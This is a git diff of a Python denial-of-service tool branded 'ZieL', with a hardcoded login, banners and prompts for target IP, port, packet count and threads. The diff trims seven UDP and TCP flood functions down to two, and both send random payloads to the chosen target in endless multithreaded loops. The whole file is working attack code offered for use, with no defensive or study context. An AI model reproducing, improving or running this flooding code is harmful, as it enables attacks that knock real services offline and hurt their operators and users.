@@ -1,8 +1,8 @@
 import random
 import socket
-import os
-import time
 import threading
+import os
+import time,sys
 
 os.system("clear")
 print("""\033[37m
@@ -67,8 +67,8 @@ if username == "ZieL" and password == "#zielx":
 else:
 	print("\033[34m[\033[37mStatus\033[34m] ═>[\033[37mCan't Login To Tools\033[34m]<═")
 	exit()
+	
 os.system("clear")
-time.sleep(2.2)
 print("""
 \033[34m╔═╗═╗ ╦╔═╗ ╦ ╦\033[31m╦╔═╗╦╔╦╗╔═╗
 \033[34m║╣ ╔╩╦╝║═╬╗║ ║\033[31m║╚═╗║ ║ ║╣ 
@@ -88,117 +88,43 @@ times = int(input("\033[31m╚════> \033[34m"))
 print("""\033[31m╔═[\033[34mZieL - Threads\033[31m]""")
 threads = int(input("\033[31m╚════> \033[34m"))
 print("""\033[31m╔═[\033[34mZieL - Ready? \033[37m(\033[32my/\033[31mn\033[37m) \033[31m]""")
-ready = str(input("\033[31m╚════> \033[34m"))
-if ready == 'n':
+choice = str(input("\033[31m╚════> \033[34m"))
+if choice == 'n':
 	exit()
 os.system("clear")
-	
+
 def run():
-	data = random._urandom(1460)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-		except:
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				
+  data = random._urandom(1024)
+  i = random.choice(("[+]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+      print(i +" \033[37mAttack Has Send To \033[31m%s\033[37m:\033[31m%s"%(ip,port))
+    except:
+      print(i +" \033[37mAttack Has Send To \033[31m%s\033[37m:\033[31m%s"%(ip,port))
+
 def run2():
-	data = random._urandom(4096)
-	while True:
-				try:
-					s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-					addr = (str(ip),int(port))
-					s.sendto(data,addr)
-					for x in range(times):
-						s.send(data)
-						print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				except:
-					s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				
-def run3():
-	data = random._urandom(2048)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-		except:
-				s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				
-def run4():
-	data = random._urandom(1460)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-		except:
-				s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				
-def run5():
-	data = random._urandom(4906)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-		except:
-				s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				
-def run6():
-	data = random._urandom(2048)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-		except:
-				s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				
-def run7():
-	data = random._urandom(4906)
-	while True:
-				try:
-					s = socket.socket(socket.SOCK_STREAM)
-					s.connect((ip,port))
-					s.send(data)
-					for x in range(times):
-						s.send(data)
-						print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				except:
-					s.close
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
-				
+  data = random._urandom(999)
+  i = random.choice(("[+]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+      print(i +" \033[37mAttack Has Send To \033[31m%s\033[37m:\033[31m%s"%(ip,port))
+    except:
+      s.close()
+      print(i +" \033[37mAttack Has Send To \033[31m%s\033[37m:\033[31m%s"%(ip,port))
+
 for y in range(threads):
-	if ready == 'y':
-		th = threading.Thread(target = run)
-		th.start()
-		th = threading.Thread(target = run2)
-		th.start()
-		th = threading.Thread(target = run3)
-		th.start()
-		th = threading.Thread(target = run4)
-		th.start()
-		th = threading.Thread(target = run5)
-		th.start()
-		th = threading.Thread(target = run6)
-		th.start()
-	else:
-		th = threading.Thread(target = run7)
-		th.start()
+  if choice == 'y':
+    th = threading.Thread(target = run)
+    th.start()
+  else:
+   	th = threading.Thread(target = run2)
+   	th.start()
